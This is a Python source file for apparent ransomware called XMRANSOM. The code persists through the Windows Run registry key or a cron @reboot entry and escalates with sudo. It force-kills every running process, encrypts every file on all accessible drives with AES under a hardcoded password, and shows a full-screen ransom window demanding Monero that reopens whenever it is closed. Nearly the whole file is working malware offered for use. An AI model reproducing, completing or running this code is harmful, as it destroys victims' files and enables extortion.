from tkinter import *
from screeninfo import get_monitors
import os
import winreg as reg
import ctypes
import sys
import psutil
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

#? Create the ransom window
class RansomWindow(Frame):
      def __init__(self, master:Tk):
        super().__init__(master)
        self.pack()
        
        #? Set up geometry and sizing
        monitor = get_monitors()[0]
        screen_width = monitor.width
        screen_height = monitor.height
        
        size_x = round(screen_width * 0.95)
        size_y = round(screen_height * 0.95)
        
        offset_x = (screen_width - size_x) // 2
        offset_y = (screen_height - size_y) // 2
        
        master.geometry(f"{size_x}x{size_y}+{offset_x}+{offset_y}")
        
        #? Set up looks
        master.overrideredirect(True)
        master.config(bg="#1E1E1E")
        
        # Display title
        title_label = Label(master, text="XMRANSOM", font=("Arial", 25, "bold"), bg="#1E1E1E", fg="white")
        title_label.pack(pady=10)
        
        # Display threatening paragraph
        paragraph_label = Label(master, text=get_labels().get("paragraph_label"), font=("Arial", 16), justify="center", bg="#1E1E1E", fg="white", wraplength=size_x)
        paragraph_label.pack(pady=80)
        
        # Display how? button
        xmr_tutorial_button = Button(master,text="how?", command=lambda: open_tutorial_window(), width=40, height=3,font=("Arial", 12, "bold"), fg="#1E1E1E")
        xmr_tutorial_button.pack()
        
        # Display very important donation address
        payout_label = Label(master, text=get_labels().get("XMR_Address"), font=("Arial", 12, "bold"), justify="center", wraplength=750, bg="#1E1E1E", fg="white")
        payout_label.pack(side="bottom")
        
        #? Set up protocols
        master.protocol("WM_DELETE_WINDOW",lambda: on_try_exit_ransomware(master))

#? Used to declutter the text spots, so it can read it from a text file instead
def get_labels():
    with open("labels.txt", 'r', encoding='utf-8') as file:
        ascii_art = {}
        current_label = None
        current_art = []

        for line in file:
            line = line.rstrip('\r\n')
            if line.startswith('---') and line.endswith('---'):
                if current_label and current_art:
                    ascii_art[current_label] = '\n'.join(current_art)
                    current_art = []
                current_label = line.replace('---', '').strip()
            else:
                current_art.append(line)

        # Append the last ASCII art piece
        if current_label and current_art:
            ascii_art[current_label] = '\n'.join(current_art)

    return ascii_art

#? Set up the tutorial window, to help people, send xmr to the address :D
def open_tutorial_window():
    tutorial_window = Tk()
    
    #? Set up sizing
    monitor = get_monitors()[0]
    screen_width = monitor.width
    screen_height = monitor.height
    
    size_x = round(screen_width * 0.60)
    size_y = round(screen_height * 0.60)
    
    offset_x = (screen_width - size_x) // 2
    offset_y = (screen_height - size_y) // 2
    
    tutorial_window.geometry(f"{size_x}x{size_y}+{offset_x}+{offset_y}")
    
    tutorial_window.title("XMR Tutorial")
    tutorial_window.iconbitmap("./images/XMRansom_logo.ico")
    
    tutorial_label = Label(tutorial_window, text=get_labels().get("XMR_tutorial"), font=("Arial", 12, "bold"), wraplength=size_x)
    tutorial_label.pack()
    
    tutorial_window.mainloop()

#? If the root window catches a close event it'll open the window again
def on_try_exit_ransomware(master:Tk):
    master.destroy()

    new_root = Tk()
    new_ransomWindow = RansomWindow(new_root)
    new_root.mainloop()

#? Starts out by checking if the ransomware already has registry keys, and admin
#? if it has, then exit
#? if it doesn't, then run the function, to gain admin, and save reg keys
def get_admin_and_startup():
    if os.name == "nt":
        #! Startup + admin priv for windows systems
        
        #? Set up keys and paths
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        app_name = os.path.basename(sys.argv[0])
        app_path = os.path.abspath(sys.argv[0])
        reg_path = r"HKCU\{}".format(key)

        try:
            # Check if the registry key already exists
            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_READ)
            value, regtype = reg.QueryValueEx(reg_key, app_name)
            reg.CloseKey(reg_key)

            # Check if the RunAsAdmin key already exists
            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_READ)
            value, regtype = reg.QueryValueEx(reg_key, f"{app_name}_RunAsAdmin")
            reg.CloseKey(reg_key)

            print(f"{app_name} is already set to run on startup and as administrator.")
        except FileNotFoundError:
            try:
                # If the registry key doesn't exist, create it
                reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
                reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, app_path)
                reg.CloseKey(reg_key)

                # Check if the application has admin privileges
                if ctypes.windll.shell32.IsUserAnAdmin():
                    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
                    reg.SetValueEx(reg_key, f"{app_name}_RunAsAdmin", 0, reg.REG_SZ, "1")
                    reg.CloseKey(reg_key)

                    print(f"{app_name} has been set to run as administrator during startup.")
                else:
                    print(f"{app_name} will run on startup, but it doesn't have admin privileges.")
            except Exception as e:
                print(f"Error occurred: {e}")
    else:
        #! Startup + sudo priv for unix systems
        
        #? Get the script added to startup
        script_path = os.path.abspath(sys.argv[0])
        # Add the script to the user's crontab to run at startup
        cron_command = f'@reboot /usr/bin/python3 {script_path}\n'
        with open('/tmp/cron_job', 'w') as cron_file:
            cron_file.write(cron_command)
        subprocess.run(['crontab', '/tmp/cron_job'], check=True)
        os.remove('/tmp/cron_job')
        
        #? Make the script run with elevated privileges
        script_path = os.path.abspath(sys.argv[0])
        # Check if the script is already running with elevated privileges
        if os.geteuid() == 0:
            print("Already running with elevated privileges.")
        else:
            # Re-run the script using sudo to get elevated privileges
            sudo_command = f'sudo /usr/bin/python3 {script_path}'
            subprocess.run(sudo_command, shell=True, check=True)

#? Closes everything even the explorer.exe to remove core gui components, and to make the ransomware the only thing being open
def close_all():
    if os.name == "nt":
        # Kill all tasks currently open on the system in windows, -f [force] -t [kill all children, will make it impossible for it to restart] 
        # -im [image name] * [wildcard for all]
        os.system("taskkill -t -f -im *")
    else:
        # Kill all tasks currently open on the system in linux/macos, -9 pkill [force] -term [make it impossible for the task to restart]
        # -e [exact match] * [wilcard for all]
        os.system("pkill -9 -term -e *")

#? Generate key from passsword
def generate_key(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password)

#? Encrypt files, uses the AES, PKCS7 padding, key generated by password and salt, and iv
def encrypt_file(file_path, password):
    salt = os.urandom(16)
    key = generate_key(password, salt)
    iv = os.urandom(16)
    
    with open(file_path, "rb") as file:
        plaintext = file.read()
        
    padder = padding.PKCS7(128).padder()
    padded_plaintext = padder.update(plaintext) + padder.finalize()
    
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()
    
    with open(file_path, "wb") as encrypted_file:
        encrypted_file.write(salt + iv + ciphertext)

#? Decryptor func
def decrypt_file(file_path, password):
    with open(file_path, "rb") as encrypted_file:
        data = encrypted_file.read()
        
    salt = data[:16]
    iv = data[16:32]
    ciphertext = data[32:]
    
    key = generate_key(password, salt)
    
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    
    unpadder = padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()
    
    with open(file_path, "wb") as decrypted_file:
        decrypted_file.write(plaintext)

#? Checks if the drives are accessible
def is_drive_accessible(drive):
    try:
        os.listdir(drive)
        return True
    except:
        return False
    
#? use the psutil lib to get all drives, then check if the drives are accessible (will exclude system drives, empty cd drives and not connected network drives)
def get_all_drives():
    all_drives = [drive.device for drive in psutil.disk_partitions() if is_drive_accessible(drive.device)]
    return all_drives

#? Returns all files in the args drive
def get_all_files(drive):
    for root, _, files in os.walk(drive):
        for file in files:
            yield os.path.join(root, file)

#? Loop through all files, and call the encrypt_file() function
def encrypt_all():
    all_drives = get_all_drives()
    for drive in all_drives:
        file_iterator = get_all_files(drive)
        for file_path in file_iterator:
            try:
                encrypt_file(file_path, b"123456789")
            except IOError:
                return False

#? Run in the beginning to set up the ransomware
def main():
    #? Set the right working directory
    script_dir = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    os.chdir(script_dir)
    
    get_admin_and_startup()
    close_all()
    encrypt_all()
    
if __name__ == "__main__":
    main()

root = Tk()
ransomWindow = RansomWindow(root)
root.mainloop()